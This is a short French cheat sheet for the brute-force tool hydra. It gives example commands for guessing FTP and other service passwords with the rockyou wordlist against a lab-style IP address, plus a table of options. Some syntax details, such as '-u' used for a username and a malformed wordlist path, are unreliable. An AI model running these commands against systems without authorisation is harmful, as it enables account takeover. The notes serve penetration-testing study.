
hydra est un outil qui permet de bruteforce de nombreux services, il est largement utilisé


### `far:ThumbsUp` Avantages :

* outils très complet
* utilisable sur de nombreux services
* utilisable sur les formulaires de connexion

### `far:ThumbsDown` Inconvénients :

 * syntaxe à connaitre


### `fas:PencilAlt`Syntaxe & Exemple : 
* Général :
```
hydra -u bob -P rockyou.txt {service}://{ip}

hydra -u bob -P rockyou {ip} {service} -s {port}
```


* ftp : 
```
hydra -u chris -P /usr/share/wordlist.rockyou.txt ftp://10.10.245.185
```

###  `fas:Terminal` Commandes principales :

| Options       | Utilité                                               |
| ------------- | ----------------------------------------------------- |
| -l bob        | spécifier 1 username                                  |
| -L user.txt   | préciser une liste d'usernames                        |
| -p motDePasse | spécifier 1 mot de passe                              |
| -P pass.txt   | spécifier une liste de mots de passe                  |
| -s            | spécifier le port                                     |
| -M            | pour spécifier plusieurs host à bruteforce            |
| -C            | utiliser des combinaison spécifique ex -> user1:pass1 |
| -V            | verbose                                               |
| -t            | nombre de connexion en parallèle (default : 16)       |
| -f            | quitter quand une paire login/password est trouvée    |






